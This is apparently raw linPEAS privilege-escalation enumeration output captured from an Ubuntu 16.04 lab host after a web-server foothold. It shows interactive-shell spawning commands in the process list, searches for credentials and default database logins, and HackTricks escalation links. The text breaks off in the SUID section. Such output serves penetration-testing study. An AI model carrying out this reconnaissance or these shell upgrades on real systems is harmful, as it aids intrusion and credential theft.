Information ╠════════════════════════════════════ [+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017\rDistributor ID: Ubuntu\rDescription: Ubuntu 16.04.2 LTS\rRelease: 16.04\rCodename: xenial\r[+] Sudo version\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.16 [+] USBCreator\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation [+] PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r[+] Date\rWed May 17 22:57:01 PDT 2023 [+] System stats\rFilesystem Size Used Avail Use% Mounted on udev 479M 0 479M 0% /dev\rtmpfs 100M 5.8M 94M 6% /run\r/dev/sda1 8.8G 1.9G 6.5G 22% /\rtmpfs 497M 0 497M 0% /dev/shm\rtmpfs 5.0M 0 5.0M 0% /run/lock\rtmpfs 497M 0 497M 0% /sys/fs/cgroup\rtotal used free shared buff/cache available\rMem: 1016000 280644 289420 34016 445936 499588\rSwap: 1046524 0 1046524\r[+] CPU info\rArchitecture: x86_64 CPU op-mode(s): 32-bit, 64-bit\rByte Order: Little Endian\rCPU(s): 2\rOn-line CPU(s) list: 0,1\rThread(s) per core: 1\rCore(s) per socket: 1\rSocket(s): 2\rNUMA node(s): 1\rVendor ID: AuthenticAMD\rCPU family: 23\rModel: 1\rModel name: AMD EPYC 7371 16-Core Processor\rStepping: 2\rCPU MHz: 3094.187\rBogoMIPS: 6188.37\rHypervisor vendor: VMware\rVirtualization type: full\rL1d cache: 32K\rL1i cache: 64K\rL2 cache: 512K\rL3 cache: 65536K\rNUMA node0 CPU(s): 0,1\rFlags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc extd_apicid eagerfpu pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xgetbv1 clzero arat\r[+] Environment\r[i] Any private information inside environment variables? HISTFILESIZE=0 SHLVL=1\rAPACHE_RUN_DIR=/var/run/apache2\rAPACHE_PID_FILE=/var/run/apache2/apache2.pid\r_=./linpeas.sh\rPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\rAPACHE_LOCK_DIR=/var/lock/apache2\rLANG=C\rHISTSIZE=0\rAPACHE_RUN_USER=www-data\rAPACHE_RUN_GROUP=www-data\rAPACHE_LOG_DIR=/var/log/apache2\rHISTFILE=/dev/null\r[+] Searching Signature verification failed in dmseg\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed Not Found [+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.\rapparmor module is loaded.\r[+] grsecurity present? ............ grsecurity Not Found\r[+] PaX bins present? .............. PaX Not Found [+] Execshield enabled? ............ Execshield Not Found [+] SELinux enabled? ............... sestatus Not Found [+] Is ASLR enabled? ............... Yes [+] Printer? ....................... lpstat Not Found\r[+] Is this a virtual machine? ..... Yes (vmware) [+] Is this a container? ........... No\r[+] Any running containers? ........ No ═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════ [+] Any sd*/disk* disk in /dev? (limit 20) disk sda\rsda1\rsda2\rsda5\r[+] Unmounted file-system?\r[i] Check if you can mount umounted devices UUID=91864e47-b735-4e83-959f-1bfd9e7fe8fc / ext4 errors=remount-ro 0 1\rUUID=5e7afb81-0cc6-4b05-815b-ae99afde252e none swap sw 0 0\r/dev/fd0 /media/floppy0 auto rw,user,noauto,exec,utf8 0 0\r════════════════════════════════════╣ Available Software ╠════════════════════════════════════ [+] Useful software /bin/nc /bin/netcat\r/usr/bin/wget\r/bin/ping\r/usr/bin/base64\r/usr/bin/python3\r/usr/bin/perl\r/usr/bin/php\r/usr/bin/sudo\r[+] Installed Compiler\r/usr/share/gcc-5 ══════════════════════════════╣ Processes, Cron, Services, Timers \u0026amp; Sockets ╠════════════════════════════════ [+] Cleaned processes [i] Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes root 1 0.0 0.5 37840 5812 ? Ss 22:23 0:00 /sbin/init noprompt\rroot 257 0.0 0.2 28356 2808 ? Ss 22:23 0:00 /lib/systemd/systemd-journald\rroot 301 0.0 0.4 45420 5004 ? Ss 22:23 0:00 /lib/systemd/systemd-udevd\rroot 316 0.0 1.0 194444 10636 ? Ssl 22:23 0:00 /usr/bin/vmtoolsd\rsystemd+ 385 0.0 0.2 100324 2568 ? Ssl 22:23 0:00 /lib/systemd/systemd-timesyncd\r└─(Caps) 0x0000000002000000=cap_sys_time\rroot 523 0.0 0.8 275760 8304 ? Ssl 22:23 0:00 /usr/lib/accountsservice/accounts-daemon[0m\rroot 525 0.0 0.9 85436 9360 ? Ss 22:23 0:00 /usr/bin/VGAuthService root 526 0.0 0.1 20100 1168 ? Ss 22:23 0:00 /lib/systemd/systemd-logind\rroot 540 0.0 0.2 29008 2872 ? Ss 22:23 0:00 /usr/sbin/cron -f\rsyslog 543 0.0 0.3 256396 3264 ? Ssl 22:23 0:00 /usr/sbin/rsyslogd -n\rmessage+ 545 0.0 0.3 42904 3856 ? Ss 22:23 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation └─(Caps) 0x0000000020000000=cap_audit_write\rroot 744 0.0 0.2 19620 2144 ? Ss 22:23 0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid\rroot 750 0.0 0.5 65520 5220 ? Ss 22:23 0:00 /usr/sbin/sshd -D\rroot 767 0.0 0.2 24044 2448 ? Ss 22:23 0:00 /usr/sbin/vsftpd /etc/vsftpd.conf\rroot 788 0.0 0.1 15940 1748 tty1 Ss+ 22:23 0:00 /sbin/agetty --noclear tty1 linux\rmysql 795 0.0 16.9 1367856 172560 ? Ssl 22:23 0:00 /usr/sbin/mysqld\rroot 855 0.0 3.1 395752 32172 ? Ss 22:23 0:00 /usr/sbin/apache2 -k start\rwww-data 874 0.0 3.6 474848 36892 ? S 22:23 0:00 _ /usr/sbin/apache2 -k start www-data 1310 0.0 0.0 4508 708 ? S 22:43 0:00 | _ sh -c uname -a; w; id; /bin/sh -i\rwww-data 1314 0.0 0.0 4508 712 ? S 22:43 0:00 | _ /bin/sh -i\rwww-data 1321 0.0 0.8 35828 8336 ? S 22:44 0:00 | _ python3 -c import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\rwww-data 1322 0.0 0.3 18228 3280 pts/0 Ss 22:44 0:00 | _ /bin/bash\rwww-data 1364 1.0 0.1 4712 1976 pts/0 S+ 22:56 0:00 | _ /bin/sh ./linpeas.sh\rwww-data 2043 0.0 0.0 4712 436 pts/0 S+ 22:57 0:00 | _ /bin/sh ./linpeas.sh\rwww-data 2047 0.0 0.3 34556 3060 pts/0 R+ 22:57 0:00 | | _ ps fauxwww\rwww-data 2046 0.0 0.0 4712 436 pts/0 S+ 22:57 0:00 | _ /bin/sh ./linpeas.sh\rwww-data 876 0.0 3.4 472552 34732 ? S 22:23 0:00 _ /usr/sbin/apache2 -k start www-data 1210 0.0 2.3 396540 24260 ? S 22:28 0:00 _ /usr/sbin/apache2 -k start www-data 1211 0.0 3.5 474740 36056 ? S 22:28 0:00 _ /usr/sbin/apache2 -k start www-data 1212 0.0 3.4 474544 35404 ? S 22:28 0:00 _ /usr/sbin/apache2 -k start www-data 1215 0.0 2.6 396768 27032 ? S 22:28 0:00 _ /usr/sbin/apache2 -k start www-data 1218 0.0 3.5 474772 36080 ? S 22:28 0:00 _ /usr/sbin/apache2 -k start www-data 1240 0.0 2.3 396516 24096 ? S 22:35 0:00 _ /usr/sbin/apache2 -k start www-data 1241 0.0 2.3 396516 24248 ? S 22:36 0:00 _ /usr/sbin/apache2 -k start www-data 1242 0.0 2.3 396516 24184 ? S 22:36 0:00 _ /usr/sbin/apache2 -k start root 877 0.0 3.1 358400 32408 ? Ss 22:23 0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)\rwww-data 881 0.0 0.7 358400 8064 ? S 22:23 0:00 _ php-fpm: pool www\rwww-data 882 0.0 0.7 358400 8064 ? S 22:23 0:00 _ php-fpm: pool www\r[+] Binary processes permissions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes -rwxr-xr-x 1 root root 1037528 Jun 24 2016 /bin/bash lrwxrwxrwx 1 root root 4 Mar 17 2017 /bin/sh -\u0026gt; dash\r-rwxr-xr-x 1 root root 326224 Jan 18 2017 /lib/systemd/systemd-journald\r-rwxr-xr-x 1 root root 618520 Jan 18 2017 /lib/systemd/systemd-logind\r-rwxr-xr-x 1 root root 141904 Jan 18 2017 /lib/systemd/systemd-timesyncd\r-rwxr-xr-x 1 root root 453240 Jan 18 2017 /lib/systemd/systemd-udevd\r-rwxr-xr-x 1 root root 44104 Dec 16 2016 /sbin/agetty\rlrwxrwxrwx 1 root root 20 Mar 17 2017 /sbin/init -\u0026gt; /lib/systemd/systemd\r-rwxr-xr-x 1 root root 123232 May 8 2018 /usr/bin/VGAuthService\r-rwxr-xr-x 1 root root 224208 Jan 12 2017 /usr/bin/dbus-daemon[0m\r-rwxr-xr-x 1 root root 48688 May 8 2018 /usr/bin/vmtoolsd\r-rwxr-xr-x 1 root root 164928 Nov 3 2016 /usr/lib/accountsservice/accounts-daemon[0m -rwxr-xr-x 1 root root 646080 Jul 15 2016 /usr/sbin/apache2\r-rwxr-xr-x 1 root root 44472 Apr 5 2016 /usr/sbin/cron\r-rwxr-xr-x 1 root root 48440 Apr 11 2016 /usr/sbin/irqbalance\r-rwxr-xr-x 1 root root 24803144 Jan 18 2017 /usr/sbin/mysqld\r-rwxr-xr-x 1 root root 599328 Apr 5 2016 /usr/sbin/rsyslogd\r-rwxr-xr-x 1 root root 799216 Aug 11 2016 /usr/sbin/sshd\r-rwxr-xr-x 1 root root 168200 Apr 13 2016 /usr/sbin/vsftpd\r[+] Files opened by processes belonging to other users\r[i] This is usually empty because of the lack of privileges to read other user processes information COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME\r[+] Processes with credentials in memory (root req)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory gdm-password Not Found gnome-keyring-daemon Not Found lightdm Not Found vsftpd process found (dump creds from memory as root) apache2 process found (dump creds from memory as root)\rsshd Not Found\r[+] Cron jobs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found\r-rw-r--r-- 1 root root 722 Apr 5 2016 /etc/crontab /etc/cron.d:\rtotal 20\rdrwxr-xr-x 2 root root 4096 Mar 17 2017 .\rdrwxr-xr-x 90 root root 4096 Mar 6 2020 ..\r-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder\r-rw-r--r-- 1 root root 670 Mar 1 2016 php\r-rw-r--r-- 1 root root 190 Mar 17 2017 popularity-contest\r/etc/cron.daily:\rtotal 48\rdrwxr-xr-x 2 root root 4096 Mar 17 2017 .\rdrwxr-xr-x 90 root root 4096 Mar 6 2020 ..\r-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder\r-rwxr-xr-x 1 root root 539 Apr 5 2016 apache2\r-rwxr-xr-x 1 root root 1474 Jan 17 2017 apt-compat\r-rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils\r-rwxr-xr-x 1 root root 1597 Nov 26 2015 dpkg\r-rwxr-xr-x 1 root root 372 May 5 2015 logrotate\r-rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db\r-rwxr-xr-x 1 root root 435 Nov 17 2014 mlocate\r-rwxr-xr-x 1 root root 249 Nov 12 2015 passwd\r-rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest\r/etc/cron.hourly:\rtotal 12\rdrwxr-xr-x 2 root root 4096 Mar 17 2017 .\rdrwxr-xr-x 90 root root 4096 Mar 6 2020 ..\r-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder\r/etc/cron.monthly:\rtotal 12\rdrwxr-xr-x 2 root root 4096 Mar 17 2017 .\rdrwxr-xr-x 90 root root 4096 Mar 6 2020 ..\r-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder\r/etc/cron.weekly:\rtotal 20\rdrwxr-xr-x 2 root root 4096 Mar 17 2017 .\rdrwxr-xr-x 90 root root 4096 Mar 6 2020 ..\r-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder\r-rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim\r-rwxr-xr-x 1 root root 771 Nov 6 2015 man-db\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r[+] Services\r[i] Search for outdated versions [ + ] apache-htcacheclean [ + ] apache2\r[ + ] apparmor\r[ - ] bootmisc.sh\r[ - ] checkfs.sh\r[ - ] checkroot-bootclean.sh\r[ - ] checkroot.sh\r[ + ] console-setup\r[ + ] cron\r[ + ] dbus\r[ + ] grub-common\r[ - ] hostname.sh\r[ - ] hwclock.sh\r[ + ] irqbalance\r[ + ] keyboard-setup\r[ - ] killprocs\r[ + ] kmod\r[ - ] mountall-bootclean.sh\r[ - ] mountall.sh\r[ - ] mountdevsubfs.sh\r[ - ] mountkernfs.sh\r[ - ] mountnfs-bootclean.sh\r[ - ] mountnfs.sh\r[ + ] mysql\r[ + ] networking\r[ + ] ondemand\r[ + ] open-vm-tools\r[ + ] php7.0-fpm\r[ - ] plymouth\r[ - ] plymouth-log\r[ + ] procps\r[ - ] rc.local\r[ + ] resolvconf\r[ - ] rsync\r[ + ] rsyslog\r[ - ] sendsigs\r[ + ] ssh\r[ + ] udev\r[ + ] ufw\r[ - ] umountfs\r[ - ] umountnfs.sh\r[ - ] umountroot\r[ + ] urandom\r[ - ] uuidd\r[ + ] vsftpd\r[ - ] x11-common\r[+] Systemd PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin [+] Analyzing .service files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services /lib/systemd/system/emergency.service is executing some relative path /lib/systemd/system/networking.service is executing some relative path\r/lib/systemd/system/rescue.service is executing some relative path\rYou can\u0026#39;t write on systemd PATH\r[+] System timers\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES\rThu 2023-05-18 13:10:01 PDT 14h left Wed 2023-05-17 22:26:18 PDT 30min ago apt-daily.timer apt-daily.service Thu 2023-05-18 22:38:55 PDT 23h left Wed 2023-05-17 22:38:55 PDT 18min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service n/a n/a n/a n/a ureadahead-stop.timer ureadahead-stop.service [+] Analyzing .timer files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers [+] Analyzing .socket files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] HTTP sockets\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] D-Bus config files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf ( \u0026lt;policy user=\u0026#34;systemd-network\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf ( \u0026lt;policy user=\u0026#34;systemd-resolve\u0026#34;\u0026gt;)\r[+] D-Bus Service Objects list\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION :1.0 526 systemd-logind root :1.0 systemd-logind.service - - :1.1 1 systemd root :1.1 init.scope - - :1.136 7018 busctl www-data :1.136 apache2.service - - :1.2 523 accounts-daemon root :1.2 accounts-daemon.service - - com.ubuntu.LanguageSelector - - - (activatable) - - org.freedesktop.Accounts 523 accounts-daemon root :1.2 accounts-daemon.service - - org.freedesktop.DBus 545 dbus-daemon messagebus org.freedesktop.DBus dbus.service - - org.freedesktop.hostname1 - - - (activatable) - - org.freedesktop.locale1 - - - (activatable) - - org.freedesktop.login1 526 systemd-logind root :1.0 systemd-logind.service - - org.freedesktop.network1 - - - (activatable) - - org.freedesktop.resolve1 - - - (activatable) - - org.freedesktop.systemd1 1 systemd root :1.1 init.scope - - org.freedesktop.timedate1 - - - (activatable) - - ═══════════════════════════════════╣ Network Information ╠════════════════════════════════════ [+] Hostname, hosts and DNS ubuntu 127.0.0.1 localhost\r127.0.1.1 ubuntu\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\rnameserver 192.168.195.254\r[+] Content of /etc/inetd.conf \u0026amp; /etc/xinetd.conf\r/etc/inetd.conf Not Found [+] Interfaces\r# symbolic names for networks, see networks(5) for more information link-local 169.254.0.0\rens160 Link encap:Ethernet HWaddr 00:50:56:ba:73:59 inet addr:192.168.195.50 Bcast:192.168.195.255 Mask:255.255.255.0\rinet6 addr: fe80::250:56ff:feba:7359/64 Scope:Link\rUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\rRX packets:2122 errors:0 dropped:0 overruns:0 frame:0\rTX packets:1742 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:1000 RX bytes:576601 (576.6 KB) TX bytes:1771470 (1.7 MB)\rlo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0\rinet6 addr: ::1/128 Scope:Host\rUP LOOPBACK RUNNING MTU:65536 Metric:1\rRX packets:248 errors:0 dropped:0 overruns:0 frame:0\rTX packets:248 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:1 RX bytes:20016 (20.0 KB) TX bytes:20016 (20.0 KB)\r[+] Networks and neighbours\rKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface\rdefault 192.168.195.254 0.0.0.0 UG 0 0 0 ens160\r192.168.195.0 * 255.255.255.0 U 0 0 0 ens160\rAddress HWtype HWaddress Flags Mask Iface\r192.168.195.254 ether 00:50:56:ba:f3:39 C ens160\r[+] Iptables rules\riptables rules Not Found [+] Active Ports\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - [+] Can I sniff with tcpdump?\rNo ════════════════════════════════════╣ Users Information ╠════════════════════════════════════ [+] My user [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users uid=33(www-data) gid=33(www-data) groups=33(www-data) [+] Do I have PGP keys?\r/usr/bin/gpg netpgpkeys Not Found\rnetpgp Not Found [+] Clipboard or highlighted text?\rxsel and xclip Not Found [+] Checking \u0026#39;sudo -l\u0026#39;, /etc/sudoers, and /etc/sudoers.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid [+] Checking sudo tokens\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens /proc/sys/kernel/yama/ptrace_scope is not enabled (1) gdb wasn\u0026#39;t found in PATH\r[+] Checking doas.conf\r/etc/doas.conf Not Found [+] Checking Pkexec policy\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2 [+] Superusers\rroot:x:0:0:root:/root:/bin/bash [+] Users with console\rbtrisk:x:1000:1000:Ubuntu,,,:/home/btrisk:/bin/bash root:x:0:0:root:/root:/bin/bash\r[+] All users \u0026amp; groups\ruid=0(root) gid=0(root) groups=0(root) uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)\ruid=10(uucp) gid=10(uucp) groups=10(uucp)\ruid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)\ruid=1000(btrisk) gid=1000 groups=1000,4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)\ruid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)\ruid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)\ruid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)\ruid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)\ruid=106(messagebus) gid=110(messagebus) groups=110(messagebus)\ruid=107(uuidd) gid=111(uuidd) groups=111(uuidd)\ruid=108(mysql) gid=117(mysql) groups=117(mysql)\ruid=109(ftp) gid=118(ftp) groups=118(ftp)\ruid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)\ruid=13(proxy) gid=13(proxy) groups=13(proxy)\ruid=2(bin) gid=2(bin) groups=2(bin)\ruid=3(sys) gid=3(sys) groups=3(sys)\ruid=33(www-data) gid=33(www-data) groups=33(www-data)\ruid=34(backup) gid=34(backup) groups=34(backup)\ruid=38(list) gid=38(list) groups=38(list)\ruid=39(irc) gid=39(irc) groups=39(irc)\ruid=4(sync) gid=65534(nogroup) groups=65534(nogroup)\ruid=41(gnats) gid=41(gnats) groups=41(gnats)\ruid=5(games) gid=60(games) groups=60(games)\ruid=6(man) gid=12(man) groups=12(man)\ruid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\ruid=7(lp) gid=7(lp) groups=7(lp)\ruid=8(mail) gid=8(mail) groups=8(mail)\ruid=9(news) gid=9(news) groups=9(news)\r[+] Login now\r22:57:04 up 33 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT\r[+] Last logons\rreboot system boot Fri Feb 17 10:23:28 2023 still running 0.0.0.0\rreboot system boot Wed Feb 15 12:00:46 2023 still running 0.0.0.0\rreboot system boot Sat Jan 28 09:57:35 2023 still running 0.0.0.0\rreboot system boot Thu Oct 27 08:17:27 2022 still running 0.0.0.0\rroot pts/0 Thu Jul 9 07:32:53 2020 - crash (840+00:44) 192.168.118.8\rreboot system boot Thu Jul 9 07:20:15 2020 still running 0.0.0.0\rroot tty1 Thu Jul 2 13:53:53 2020 - down (00:02) 0.0.0.0\rreboot system boot Thu Jul 2 13:52:39 2020 - Thu Jul 2 13:56:20 2020 (00:03) 0.0.0.0\rwtmp begins Thu Jul 2 13:52:39 2020\r[+] Last time logon each user\rUsername Port From Latest root pts/0 192.168.118.8 Thu Jul 9 07:32:53 -0700 2020\r[+] Password policy\rPASS_MAX_DAYS 99999 PASS_MIN_DAYS 0\rPASS_WARN_AGE 7\rENCRYPT_METHOD SHA512\r[+] Do not forget to test \u0026#39;su\u0026#39; as any other user with shell: without password and with their names as password (I can\u0026#39;t do it...) [+] Do not forget to execute \u0026#39;sudo -l\u0026#39; without password or with valid password (if you know it)!! ═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════ [+] MySQL version mysql Ver 14.14 Distrib 5.7.17, for Linux (x86_64) using EditLine wrapper [+] MySQL connection using default root/root ........... No\r[+] MySQL connection using root/toor ................... No [+] MySQL connection using root/NOPASS ................. No [+] Searching mysql credentials and exec From \u0026#39;/etc/mysql/mysql.conf.d/mysqld.cnf\u0026#39; Mysql user: user = mysql Found readable /etc/mysql/my.cnf\r!includedir /etc/mysql/conf.d/\r!includedir /etc/mysql/mysql.conf.d/\r[+] PostgreSQL version and pgadmin credentials\rNot Found [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No\r[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No [+] Apache server info\rVersion: Server version: Apache/2.4.18 (Ubuntu) Server built: 2016-07-14T12:32:26\rPHP exec extensions\r/etc/apache2/mods-enabled/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(p[3457]?|t|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.0.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-enabled/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.0.conf: SetHandler application/x-httpd-php-source\r--\r/etc/apache2/mods-available/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(p[3457]?|t|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.0.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-available/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.0.conf: SetHandler application/x-httpd-php-source\r[+] Searching PHPCookies\rNot Found [+] Searching Wordpress wp-config.php files\rwp-config.php Not Found [+] Searching Drupal settings.php files\r/default/settings.php Not Found [+] Searching Moodle config.php files\rconfig.php inside a moodle folder Not Found [+] Searching Tomcat users file\rtomcat-users.xml Not Found [+] Mongo information\rmongo binary Not Found [+] Searching supervisord configuration file\rsupervisord.conf Not Found [+] Searching cesi configuration file\rcesi.conf Not Found [+] Searching Rsyncd config file\rrsyncd.conf Not Found [+] Searching Hostapd config file hostapd.conf Not Found [+] Searching wifi conns file\rNot Found [+] Searching Anaconda-ks config files\ranaconda-ks.cfg Not Found [+] Searching .vnc directories and their passwd files\r.vnc Not Found [+] Searching ldap directories and their hashes\r/etc/ldap The password hash is from the {SSHA} to \u0026#39;structural\u0026#39;\r[+] Searching .ovpn files and credentials\r.ovpn Not Found [+] Searching ssl/ssh files\rPort 22 PermitRootLogin yes\rPubkeyAuthentication yes\rPermitEmptyPasswords no\rChallengeResponseAuthentication no\rUsePAM yes\r--\u0026gt; /etc/hosts.allow file found, read the rules:\r/etc/hosts.allow\rSearching inside /etc/ssh/ssh_config for interesting info\rHost *\rSendEnv LANG LC_*\rHashKnownHosts yes\rGSSAPIAuthentication yes\rGSSAPIDelegateCredentials no\r[+] Searching unexpected auth lines in /etc/pam.d/sshd\rNo [+] Searching Cloud credentials (AWS, Azure, GC)\r[+] NFS exports?\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe /etc/exports Not Found [+] Searching kerberos conf files and tickets\r[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt tickets kerberos Not Found klist Not Found [+] Searching Kibana yaml\rkibana.yml Not Found [+] Searching Knock configuration\rKnock.config Not Found [+] Searching logstash files\rNot Found [+] Searching elasticsearch files\rNot Found [+] Searching Vault-ssh files\rvault-ssh-helper.hcl Not Found [+] Searching AD cached hashes\rcached hashes Not Found [+] Searching screen sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions screen Not Found [+] Searching tmux sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions tmux Not Found [+] Searching Couchdb directory\r[+] Searching redis.conf\r[+] Searching dovecot files\rdovecot credentials Not Found [+] Searching mosquitto.conf\r[+] Searching neo4j auth file\r[+] Searching Cloud-Init conf file\r[+] Searching Erlang cookie file\r[+] Searching GVM auth file\r[+] Searching IPSEC files\r[+] Searching IRSSI files\r[+] Searching Keyring files\rKeyring folder: /usr/share/keyrings /usr/share/keyrings:\rtotal 20\r-rw-r--r-- 1 root root 12335 May 18 2012 ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 0 May 18 2012 ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 1227 May 18 2012 ubuntu-master-keyring.gpg\rKeyring folder: /var/lib/apt/keyrings\r/var/lib/apt/keyrings:\rtotal 16\r-rw-r--r-- 1 root root 12335 Feb 15 2017 ubuntu-archive-keyring.gpg\r[+] Searching Filezilla sites file\r[+] Searching backup-manager files\r[+] Searching uncommon passwd files (splunk)\r[+] Searching GitLab related files\r[+] Searching PGP/GPG\rPGP/GPG software: /usr/bin/gpg\rnetpgpkeys Not Found\rnetpgp Not Found [+] Searching vim files\r[+] Checking if containerd(ctr) is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation [+] Checking if runc is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation [+] Searching docker files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket [+] Interesting Firefox Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Interesting Chrome Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Autologin Files\r[+] S/Key authentication\r[+] YubiKey authentication\r[+] Passwords inside pam.d\r[+] FastCGI Params\r[+] SNMPs\r════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found -rwsr-xr-x 1 root root 